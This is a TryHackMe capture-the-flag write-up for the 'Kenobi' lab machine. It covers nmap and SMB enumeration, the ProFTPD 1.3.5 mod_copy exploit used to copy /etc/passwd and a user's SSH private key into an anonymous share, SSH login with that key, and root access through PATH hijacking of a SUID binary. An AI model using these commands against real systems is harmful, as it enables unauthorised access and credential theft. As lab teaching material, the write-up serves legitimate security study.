---
title: "Kenobi - THM"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2021-11-21 02:33:29 +05:30
categories: [Writeups, TryHackMe]
tags: [THM, ProFTPD, PATH]
render_with_liquid: false
---

## Enumeration

- `nmap -Pn -p- -A 10.10.114.180`

```
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 60 ProFTPD 1.3.5
22/tcp    open  ssh         syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp    open  http        syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/admin.html
111/tcp   open  rpcbind     syn-ack ttl 60 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      44864/udp6  mountd
|   100005  1,2,3      50049/tcp6  mountd
|   100005  1,2,3      54921/tcp   mountd
|   100005  1,2,3      57249/udp   mountd
|   100021  1,3,4      34301/udp   nlockmgr
|   100021  1,3,4      42343/tcp   nlockmgr
|   100021  1,3,4      45217/tcp6  nlockmgr
|   100021  1,3,4      52968/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 60 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 60 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     syn-ack ttl 60 2-3 (RPC #100227)
33291/tcp open  mountd      syn-ack ttl 60 1-3 (RPC #100005)
36651/tcp open  mountd      syn-ack ttl 60 1-3 (RPC #100005)
42343/tcp open  nlockmgr    syn-ack ttl 60 1-4 (RPC #100021)
54921/tcp open  mountd      syn-ack ttl 60 1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-11-21T07:00:52-06:00
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time:
|   date: 2021-11-21T13:00:52
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 4604/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 57188/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40874/udp): CLEAN (Failed to receive data)
|   Check 4 (port 43903/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h00m09s, deviation: 3h27m51s, median: 8s
```

### SMB

```
nmap -Pn -sV -p 139,445 --script=smb-os-discovery,'smb-vuln*','smb-enum*' 10.10.114.180
```

```
\\10.10.114.180\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
```

- `smbclient --no-pass \\\\10.10.114.180\\anonymous`
- `get log.txt`
- `cat log.txt`

```
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
```

- We got the path to SSH keys which will be useful later.

---

## Exploitation

- Google or searchsploit ProFTPd 1.3.5
- [ProFTPd 1.3.5 File Copy Exploit](https://www.exploit-db.com/exploits/36742)
- Everything copied to `/home/kenobi/share/` using FTP file copy exploit was accessible through `/anonymous` share using `smbclient`.

```
FTP Anonymous Login =>

ftp> site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> site cpto /home/kenobi/share/passwd
250 Copy successful

ftp> site cpfr /etc/samba/smb.conf
350 File or directory exists, ready for destination name
ftp> site cpto /home/kenobi/share/smb.conf
250 Copy successful

ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /home/kenobi/share/id_rsa
250 Copy successful
```

- Then get these files from `/anonymous` share. 
- `smbclient --no-pass \\\\10.10.114.180\\anonymous`

```
smb:\> ls 
log.txt, passwd, id_rsa, smb.conf

smb:\> get id_rsa
```

- Change the permissions on `id_rsa` file.
- `chmod 600 id_rsa`
- `ssh -i id_rsa kenobi@10.10.114.180` 
- `whoami` <span class="fat-arrow">=></span> `kenobi`

---

## Privilege Escalation with PATH Manipulation 

- `find / -perm -u=s -type f 2>/dev/null`
- There is an odd looking `/usr/bin/menu` entry.
- `strings /usr/bin/menu` 

```
strings /usr/bin/menu

1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
```

- It is calling `curl`, `uname`, and `ifconfig` without absolute path.
- We can create a binary named as either of these 3 in `/tmp` and add it to path.
- `cp /bin/bash /tmp/curl` OR
- `echo "/bin/bash -p" > /tmp/curl`
- `export PATH=/tmp:$PATH`
- Now when `curl` is invoked without absolute path (`/usr/bin/curl`), it will be invoked from `/tmp/curl`

```bash
echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/
```

- `/usr/bin/menu` <span class="fat-arrow">=></span> Press 1 as it invoked `curl`
- We get a root shell
- `whoami` <span class="fat-arrow">=></span> `root`

